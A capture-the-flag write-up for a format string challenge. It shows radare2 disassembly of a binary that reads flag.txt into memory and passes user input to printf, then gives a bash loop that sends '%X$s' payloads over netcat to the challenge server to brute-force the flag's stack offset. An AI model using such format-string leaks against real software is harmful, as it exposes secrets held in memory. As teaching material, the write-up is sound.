# secret-flag

## Description

NotDeGhost

There's a super secret flag in printf that allows you to LEAK the data at an address??

## Solution

We're given a binary executable as well as a netcat command to connect us to the same program running on the server.

The challenge description hints at a format string vulnerability, but we can disassemble the binary to learn more.

```asm
[0x00000810]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00000810]> afl
0x00000810    1 42           entry0
0x00000780    1 6            sym.imp.puts
0x00000790    1 6            sym.imp.__stack_chk_fail
0x000007a0    1 6            sym.imp.setbuf
0x000007b0    1 6            sym.imp.printf
0x000007c0    1 6            sym.imp.read
0x00000000    3 216  -> 209  loc.imp._ITM_deregisterTMCloneTable
0x000007d0    1 6            sym.imp.fgets
0x000007e0    1 6            sym.imp.malloc
0x000007f0    1 6            sym.imp.open
0x00000910    5 154  -> 67   entry.init0
0x000008d0    5 58   -> 51   entry.fini0
0x00000840    4 50   -> 40   fcn.00000840
0x00000750    3 23           fcn.00000750
0x0000091a    3 258          main
[0x00000810]> pdf @ main
            ; DATA XREF from entry0 @ 0x82d
┌ 258: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_2ch @ rbp-0x2c
│           ; var int64_t var_28h @ rbp-0x28
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_8h @ rbp-0x8
│           0x0000091a      55             push rbp
│           0x0000091b      4889e5         mov rbp, rsp
│           0x0000091e      4883ec30       sub rsp, 0x30
│           0x00000922      64488b042528.  mov rax, qword fs:[0x28]
│           0x0000092b      488945f8       mov qword [var_8h], rax
│           0x0000092f      31c0           xor eax, eax
│           0x00000931      bf00010000     mov edi, 0x100              ; size_t size
│           0x00000936      e8a5feffff     call sym.imp.malloc         ;  void *malloc(size_t size)
│           0x0000093b      488945d8       mov qword [var_28h], rax
│           0x0000093f      be00000000     mov esi, 0                  ; int oflag
│           0x00000944      488d3d5d0100.  lea rdi, str.flag.txt       ; 0xaa8 ; "flag.txt" ; const char *path
│           0x0000094b      b800000000     mov eax, 0
│           0x00000950      e89bfeffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x00000955      8945d4         mov dword [var_2ch], eax
│           0x00000958      488b4dd8       mov rcx, qword [var_28h]
│           0x0000095c      8b45d4         mov eax, dword [var_2ch]
│           0x0000095f      ba00010000     mov edx, 0x100              ; size_t nbyte
│           0x00000964      4889ce         mov rsi, rcx                ; void *buf
│           0x00000967      89c7           mov edi, eax                ; int fildes
│           0x00000969      b800000000     mov eax, 0
│           0x0000096e      e84dfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00000973      488b05a60620.  mov rax, qword [obj.stdout] ; [0x201020:8]=0
│           0x0000097a      be00000000     mov esi, 0                  ; char *buf
│           0x0000097f      4889c7         mov rdi, rax                ; FILE *stream
│           0x00000982      e819feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x00000987      488b05a20620.  mov rax, qword [obj.stdin]  ; [0x201030:8]=0
│           0x0000098e      be00000000     mov esi, 0                  ; char *buf
│           0x00000993      4889c7         mov rdi, rax                ; FILE *stream
│           0x00000996      e805feffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x0000099b      488b059e0620.  mov rax, qword [obj.stderr] ; [0x201040:8]=0
│           0x000009a2      be00000000     mov esi, 0                  ; char *buf
│           0x000009a7      4889c7         mov rdi, rax                ; FILE *stream
│           0x000009aa      e8f1fdffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x000009af      488d3d020100.  lea rdi, str.I_have_a_secret_flag__which_you_ll_never_get ; 0xab8 ; "I have a secret flag, which you'll never get!" ; const char *s
│           0x000009b6      e8c5fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000009bb      488d3d260100.  lea rdi, str.What_is_your_name__young_adventurer ; 0xae8 ; "What is your name, young adventurer?" ; const char *s
│           0x000009c2      e8b9fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x000009c7      488b15620620.  mov rdx, qword [obj.stdin]  ; [0x201030:8]=0 ; FILE *stream
│           0x000009ce      488d45e0       lea rax, [var_20h]
│           0x000009d2      be14000000     mov esi, 0x14               ; rsi ; int size
│           0x000009d7      4889c7         mov rdi, rax                ; char *s
│           0x000009da      e8f1fdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x000009df      488d3d270100.  lea rdi, str.Hello_there:   ; 0xb0d ; "Hello there: " ; const char *format
│           0x000009e6      b800000000     mov eax, 0
│           0x000009eb      e8c0fdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x000009f0      488d45e0       lea rax, [var_20h]
│           0x000009f4      4889c7         mov rdi, rax                ; const char *format
│           0x000009f7      b800000000     mov eax, 0
│           0x000009fc      e8affdffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00000a01      b800000000     mov eax, 0
│           0x00000a06      488b4df8       mov rcx, qword [var_8h]
│           0x00000a0a      6448330c2528.  xor rcx, qword fs:[0x28]
│       ┌─< 0x00000a13      7405           je 0xa1a
│       │   0x00000a15      e876fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
│       │   ; CODE XREF from main @ 0xa13
│       └─> 0x00000a1a      c9             leave
└           0x00000a1b      c3             ret
[0x00000810]>
```

We can see that the contents of the flag file are loaded into memory at the start of the `main` function.

Additionally, user input is passed directly to a `printf` call, allowing us to inject a format string and leak the program memory.

By sending `%X$s` as the user input, where `X` is the offset to the desired string, we can print a string from memory.
Though we don't know the offset to the flag, this can be bruteforced using a simple script.

## Exploit Script

```sh
#!/bin/bash

x=1
while [ 1 -le 2 ]
do
    echo '%'$x'$s'
    echo '%'$x'$s' | nc 2020.redpwnc.tf 31826 | grep 'flag{'
    x=$(( $x + 1 ))
done
```

## Flag

```flag{n0t_s0_s3cr3t_f1ag_n0w}```

